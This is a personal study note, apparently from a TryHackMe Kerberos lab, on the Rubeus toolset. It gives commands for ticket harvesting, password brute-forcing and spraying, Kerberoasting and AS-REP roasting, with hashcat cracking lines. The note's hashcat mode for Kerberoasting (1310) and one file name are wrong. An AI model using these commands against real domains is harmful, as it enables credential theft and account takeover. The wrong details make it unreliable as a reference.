<- [[Kerberos]]
<- [[THM - Attacking Kerberos]]
# Rubeus
Github: https://github.com/GhostPack/Rubeus

A #C\# toolset for raw #Kerberos interaction and abuses #red_team , though like any red team tool it can be used for operational security as well. Its features are **_extensive_**, please refer to the Github for comprehensive documentation

**Some Rubeus tools & attacks:**
- Overpass the Hash
- Ticket Requests and Renewals
- Ticket Management
- Ticket Extraction
- Harvesting
- Pass the Ticket
- AS-REP Roasing
- Kerberoasting


## Installation
There are no compiled binaries available, so the application has to compiled from source. 
<iframe src="https://github.com/GhostPack/Rubeus#compile-instructions" class="resize-vertical"></iframe>


## Harvesting Tickets
Running on/from the Target machine, you can harvest tickets that are being transferred to the KDC and save them for use in other attacks like *pass-the-ticket*. 

**Example, harvest TGTs for 30 seconds**:
This will harvest tickets every 30 seconds indefinitely (i.e. until terminated)
`Rubeus.exe harvest /interval:30`

![[Rubeus-harvest-tickets-interval-30sec.png]]

## Brute Force Passwords
***This can result in account lockout***
Uses a wordlist of passwords to attack a single user account. 

Successful brute force results in a **.kirbi** ticket from the targeted user, a TGT that can be used to get service tickets from the KDC or used in Pass-the-Ticket. 

**Optional Required**
- Add domain controller domain name to Windows host file. 
	- Ex. `echo 10.10.173.126 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
- If you **DONT** add you'll need the `/dc:DOMAIN_CONTROLLER` option when carrying out the command.

**Example, brute user `user1`, password list `plist.txt`, DC added to hosts**
`Rubeus.exe brute /user:user1 /passwords:pslist.txt /noticket`


## Password Spraying
***This can result in account lockout***
Uses a single password and sprays against all found user accounts in the domain. 

Successful spray results in a **.kirbi** ticket, a TGT that can be used to get service tickets from the KDC or used in Pass-the-Ticket. 

**Optional Required**
- Add domain controller domain name to Windows host file. 
	- Ex. `echo 10.10.173.126 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
- If you **DONT** add you'll need the `/dc:DOMAIN_CONTROLLER` option when carrying out the command.
 
 
**Example, spray `Password1` at all found users, added DC to hosts**
`Rubeus.exe brute /password:Password1 /noticket`

**Example spray `Password1` at all found users, DC passed as arg**
`Rubeus.exe brute /password:Password1 /dc:10.10.173.126 /noticket`
![[Rubeus-password-spray-example.png]]

## Kerberoasting
Returns a hash for Kerberoastable accounts that can be cracked with hashcat (`hashcat -m 1310 -a 0 <in-hash>.txt <wordlist>.txt`). 

**Optional Required**
- Add domain controller domain name to Windows host file. 
	- Ex. `echo 10.10.173.126 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
- If you **DONT** add you'll need the `/dc:DOMAIN_CONTROLLER` option when carrying out the command.

**RECOMMENDATION** 
use `/nowrap` to make copying the hash easier

**Example, DC added to host**
`Rubeus.exe kerberoast`
![[Rubeus-kerberoasting-example.png]]

**Example, DC added to host, /nowrap**
`Rubeus.exe kerberoast /nowrap`
![[Rubeus-kerberoast-nowrap.png]]

## AS-REP Roasting
Returns a hash for AS-REP Roastable accounts that can be cracked with hashcat (`hashcat -m 18200 -a 0 hash.txt <wordlist>.txt`)

**Example**
`Rubeus.exe asreproast`
![[Rubeus-AS-REP-Roasting-example.png]]